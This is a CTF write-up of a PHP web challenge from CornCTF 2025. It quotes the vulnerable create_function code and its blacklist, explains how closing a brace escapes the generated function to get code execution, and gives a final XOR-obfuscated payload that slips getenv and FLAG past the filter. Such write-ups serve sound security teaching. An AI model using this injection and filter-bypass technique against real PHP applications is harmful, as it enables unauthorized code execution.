---
title: CornCTF 2025 - phpislovephpislife 3
date: 2025-07-28
lastmod: 2025-07-28T19:59:34+02:00
categories:
  - writeup
  - cornCTF
tags:
  - web
  - php
authors:
  - Valenter
---
As the title suggests, straightforward PHP shenanigans.

Let's dive in.

## Overview

There's only one file we need to look at, and the author has been kind enough to highlight the relevant parts for us

```php
if (isset($_POST['code'])) {

    $code = $_POST['code'];
    // I <3 blacklists
    $characters = ['\`', '\[', '\*', '\.', '\\\\', '\=', '\+', '\$'];
    $classes = get_declared_classes();
    $functions = get_defined_functions()['internal'];
    $strings = ['eval', 'include', 'require', 'function', 'flag', 'echo', 'print', '\$.*\{.*\$', '\}[^\{]*\}', '?>'];
    $variables = ['_GET', '_POST', '_COOKIE', '_REQUEST', '_SERVER', '_FILES', '_ENV', 'HTTP_ENV_VARS', '_SESSION', 'GLOBALS', 'variables', 'strings', 'blacklist', 'functions', 'classes', 'code'];

    $blacklist = array_merge($characters, $classes, $functions, $variables, $strings);

    foreach ($blacklist as $blacklisted) {

        if (preg_match('/' . $blacklisted . '/im', $code)) {

            $output = 'No hacks pls';
        }
    }

    if (count($_GET) != 0 || count($_POST) > 1) {
        $output = 'No hacks pls';
    }

    if (!isset($output)) {
        $my_function = create_function('', $code);
        // $output = $my_function(); // I don't trust you
        $output = 'This function is disabled.';
    }
    echo $output;
}
```

There's a pretty strict blacklist in place that won't allow us to use any of the convenient php tools to carry out our exploit: no built-in functions, no superglobals and very few available symbols.

What are we exploiting exactly?

This part right here:

```php
    if (!isset($output)) {
        $my_function = create_function('', $code);
        // $output = $my_function(); // I don't trust you
        $output = 'This function is disabled.';
    }
    echo $output;
```
The author thought cleverly to stop our function from executing by commenting `$output` out, unfortunately for him, though, `create_function` still takes our input as an argument, so we can just insert our own comment at the end of our inputted code and let the `eval` that create_function runs internally do its magic.

### How does this work *exactly*

Internally, eval does something of the sort:
```php
$wrapper = 'function __lambda'.$uniq.'() { ' . $code . '; }';
```
and then runs `eval($wrapper)`

Everything inside `{}` doesn't get executed but is rather defined as the function's body;
**however**, if we close the curly bracket at the start of our injected code, we can leave the function's context and `eval` will execute our code, granting us RCE.

But how do we take advantage of this?

There are a few flaws in the blacklist implementation, notably, it allows `die()` and several symbols that we can use to craft a payload.

## Exploitation phase

With a bit of fuzzing and recalling that PHP allows operations on strings such as XOR, we can obfuscate our input `die(getenv(flag))` in such a way that it bypasses the blocklist.

Final payload:
```php
};die(('WUDU^F'^'000000')(('v|qw')^'0000'));//
```
- `'WUDU^F'^'000000'` is `getenv` xorred
- `'v|qw')^'0000'` is `FLAG` xorred

This is only possible because PHP allows functions to be called by referencing them as strings

https://www.youtube.com/watch?v=hRnUR7fJdaU&list=RDhRnUR7fJdaU&start_radio=1
